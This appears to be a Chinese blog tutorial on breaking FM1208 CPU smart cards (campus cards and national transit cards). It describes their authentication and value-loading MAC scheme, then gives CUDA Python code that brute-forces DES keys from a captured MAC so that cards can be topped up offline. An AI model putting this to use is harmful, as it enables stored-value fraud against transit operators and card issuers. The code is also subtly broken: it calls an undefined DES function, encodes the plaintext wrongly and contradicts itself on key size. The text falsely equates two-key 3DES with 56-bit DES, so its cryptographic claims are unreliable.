## CPU卡原理及破解

 **1. 介绍CPU卡类型**
 主要介绍在中国广泛使用的CPU卡
 fm1208卡主要用于学校医院和市政一卡通
 且该卡有两种模式，纯cpu模式及cpu+m1模式
 fm1280卡主要用于银行卡类，暂时不破解
 银行卡应该使用双芯片，具体了解不多目前
 目前针对fm1208卡
 **2.阐述认证逻辑**
 外部认证：卡片对读卡机认证，认证后可知读卡机合法
 内部认证：读卡机对卡片认证，认证后可知卡片合法
 口令密钥：该密钥主要读取，一些软件可以直接读的具体原理
 笔者没有找到一些资料，先不说啦。
 无漏洞M1模拟部分：有些卡会有模拟m1的部分，今年8月
 quarkslab一个专家破解了该部分，自己搜索一下吧。
 MAC认证：专门针对市政交通卡设计的强算法（全国交通联合）
 **3.普通校园卡破解方法**
口令pin和m1部分可以一键破解
需要破解的是内部和外部认证

下面为大家介绍一下认证逻辑：（pcd表示卡片，picc表示读卡机）

picc向pcd取随机数
pcd将随机数使用单des，ecb加密后结果前4字节发送
picc由于拥有相同des密钥，解开后验证及证明ic卡
存有与picc相同的des密钥，验证了pcd的合法性
这是外部认证，内部认证即相反的过程！

规则与破解方法：假设4字节随机数为01020304
实际上不可能是这样，方便解说
再其后加80000000，凑够8字节数据用于des加密
密钥也是8字节数据由于奇偶校验位实际密钥长度为2的56次方
加密后得到密文前半部分，具体破解方法是
使用专业fpga穷举des密钥核对，核对成功的数据再
使用其他明文密文对验证，最后得出唯一解即可。

以上就是破解cpu卡认证的方法。

**4.全国交通联合卡破解**
这里我们主要是破解卡片圈存的问题
下面介绍其逻辑：
picc和卡片都有一个load key但不直接使用
MAC是使用session key再通过pboc-mac加密得到
session key 是通过明文数据和随机数等通过load key
采用3des（2keys）加密得到的结果，其主要作用是生成MAC
MAC分为MAC1和MAC2，它们的作用是让picc和pcd各自验证彼此
然后完成圈存后卡片返回一个TAC到服务器，这里就先不研究了
先看卡片上数据如何更改，服务器方面有它的破解方法不一样
以上就是其原理的一般解析，下面我们理清数据实际破解一下
**破解前的分析和数据整理**

（1）第一小节

session key的明文数据00000168（旧余额）+00000064（交易金额）+02（交易类型电子钱包圈存）+800100010000（终端机编号）+80（凑够16字节加密使用）

session key的明文：80

session key的密文MAC1：2A39E05E（实际应该为16字节，由于只需要验证故只取前4字节）

使用的加密算法：ANSI x99

（2）第二小节

假设已经破解得到了session key，将其表示为SK

load key 的密文即经过3des加密得到的SK

load key 的加密算法3des加密

load key 的明文部分为 inputdata

明文为：9df3847c（卡片产生的随机数）+0004（联机交易序号）+8000（凑够8字节）

（3）第三小节

简单解释一下3des加密和ansi x99加密的原理

3des：密钥前半部分为k1后半部分为k2加密过程为先用k1加密再用k2解密最后再k1加密

解密的过程即将加密的过程反转。

ansix99：将数据打包分成几个八字节块然后与初始值进行异或后再des加密最后得出结果

具体破解方法都是类似的3des加密2key模式基本等同于
单des加密的密钥长度2的56次方
mac的解法由于明文和sessionkey差距不大，
从数学上来说可能会有更快的破解方法
即使现在的条件也很容易破解

破解得到原始des密钥即可对公交卡实现离线圈存功能
具体代码实现如下：

    from numba import cuda
import numpy as np
import time
import binascii
import sys

# CUDA 核心函数：PBOC-MAC 加密和密钥检查
@cuda.jit
def pboc_mac_kernel_with_progress(iv, plaintext, target, keys_per_thread, key_offset, results, found_flag, progress_counter):
    idx = cuda.grid(1)
    start_key = idx * keys_per_thread + key_offset

    for key_index in range(keys_per_thread):
        if found_flag[0]:  # 如果找到密钥，提前退出
            return

        current_key = start_key + key_index
        key = current_key.to_bytes(8, byteorder='big')  # 转换为 8 字节密钥

        # Step 1: 初始向量异或明文前 8 字节
        xor_result = cuda.local.array(8, dtype=np.uint8)
        for i in range(8):
            xor_result[i] = plaintext[i] ^ iv[i]

        # Step 2: DES 加密第一阶段
        des1 = des_encrypt_device(key, xor_result)

        # Step 3: 异或明文后 8 字节
        xor_result2 = cuda.local.array(8, dtype=np.uint8)
        for i in range(8):
            xor_result2[i] = des1[i] ^ plaintext[8 + i]

        # Step 4: DES 加密第二阶段
        des2 = des_encrypt_device(key, xor_result2)

        # 检查密文前 4 字节是否匹配目标
        match = True
        for i in range(4):
            if des2[i] != target[i]:
                match = False
                break

        if match:
            # 记录结果
            for i in range(8):
                results[idx * 8 + i] = key[i]
            found_flag[0] = 1

        # 更新进度计数器
        if idx == 0 and key_index % 256 == 0:
            cuda.atomic.add(progress_counter, 0, 1)

# 主程序：利用 GPU 并行破解密钥
def gpu_brute_force_with_progress(iv, plaintext, target_prefix):
    num_keys = 2**24  # 测试较小的密钥空间（完整 2^64 空间需分片处理）
    keys_per_thread = 256  # 每个线程尝试的密钥数量
    threads_per_block = 256
    blocks_per_grid = (num_keys + keys_per_thread * threads_per_block - 1) // (keys_per_thread * threads_per_block)

    # 初始化数据
    iv = np.frombuffer(iv, dtype=np.uint8)
    plaintext = np.frombuffer(plaintext, dtype=np.uint8)
    target_prefix = np.frombuffer(target_prefix, dtype=np.uint8)
    results = np.zeros(blocks_per_grid * threads_per_block * 8, dtype=np.uint8)
    found_flag = np.array([0], dtype=np.uint8)
    progress_counter = np.array([0], dtype=np.uint32)

    # 分配 GPU 内存
    d_iv = cuda.to_device(iv)
    d_plaintext = cuda.to_device(plaintext)
    d_target = cuda.to_device(target_prefix)
    d_results = cuda.to_device(results)
    d_found_flag = cuda.to_device(found_flag)
    d_progress_counter = cuda.to_device(progress_counter)

    # 启动 CUDA 核心函数
    start_time = time.time()
    pboc_mac_kernel_with_progress[blocks_per_grid, threads_per_block](
        d_iv, d_plaintext, d_target, keys_per_thread, 0, d_results, d_found_flag, d_progress_counter
    )
    cuda.synchronize()
    end_time = time.time()

    # 获取结果
    results = d_results.copy_to_host()
    found_flag = d_found_flag.copy_to_host()
    progress_counter = d_progress_counter.copy_to_host()

    # 汇总匹配密钥
    matched_keys = []
    for i in range(blocks_per_grid * threads_per_block):
        if results[i * 8: (i + 1) * 8].any():
            matched_keys.append(results[i * 8: (i + 1) * 8])

    # 打印结果
    print("\n--- 计算完成 ---")
    print(f"总耗时: {end_time - start_time:.2f} 秒")
    print(f"尝试密钥数: {num_keys}")
    print(f"每秒尝试密钥: {num_keys / (end_time - start_time):.2f}")
    print("匹配密钥列表:")
    for key in matched_keys:
        print(f"- {binascii.hexlify(key)}")
    print("计算进度: 100%")

# 示例数据
iv = b'\x00' * 8  # 初始向量全为0
plaintext = b'000001680000006402800100010000'  # 明文
partial_ciphertext = b'\x2A\x39\xE0\x5E'  # 密文前4字节




